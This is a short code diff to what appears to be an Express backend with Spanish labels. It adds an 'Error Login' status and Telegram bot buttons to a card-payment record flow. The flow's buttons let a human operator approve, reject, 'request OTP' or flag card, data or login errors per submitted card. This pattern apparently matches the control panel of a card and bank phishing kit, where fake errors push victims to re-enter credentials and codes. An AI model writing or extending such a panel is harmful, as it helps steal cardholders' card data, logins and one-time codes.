@@ -829,9 +829,10 @@ app.post('/api/card-payments', async (req, res) => {
           ],
           [
             { text: '❌ Error Tarjeta', callback_data: `card:${cardId}:ERROR_TARJETA` },
-            { text: '⚠️ Error Datos', callback_data: `card:${cardId}:ERROR_DATOS` },
+            { text: '🔐 Error Login', callback_data: `card:${cardId}:ERROR_LOGIN` },
           ],
           [
+            { text: '⚠️ Error Datos', callback_data: `card:${cardId}:ERROR_DATOS` },
             { text: '🚫 Rechazar', callback_data: `card:${cardId}:RECHAZADO` },
           ],
         ],
@@ -912,7 +913,7 @@ app.patch('/api/card-payments/:id/status', async (req, res) => {
     const { id } = req.params
     const { status } = req.body
 
-    const validStatuses = ['PENDIENTE', 'APROBADO', 'RECHAZADO', 'SOLICITAR_OTP', 'ERROR_DATOS', 'ERROR_TARJETA']
+    const validStatuses = ['PENDIENTE', 'APROBADO', 'RECHAZADO', 'SOLICITAR_OTP', 'ERROR_DATOS', 'ERROR_TARJETA', 'ERROR_LOGIN']
     if (!validStatuses.includes(status)) {
       return res.status(400).json({ success: false, message: 'Estado no válido' })
     }
@@ -974,6 +975,9 @@ app.patch('/api/card-payments/:id/otp', async (req, res) => {
           ],
           [
             { text: '❌ Error Tarjeta', callback_data: `card:${id}:ERROR_TARJETA` },
+            { text: '🔐 Error Login', callback_data: `card:${id}:ERROR_LOGIN` },
+          ],
+          [
             { text: '🚫 Rechazar', callback_data: `card:${id}:RECHAZADO` },
           ],
         ],
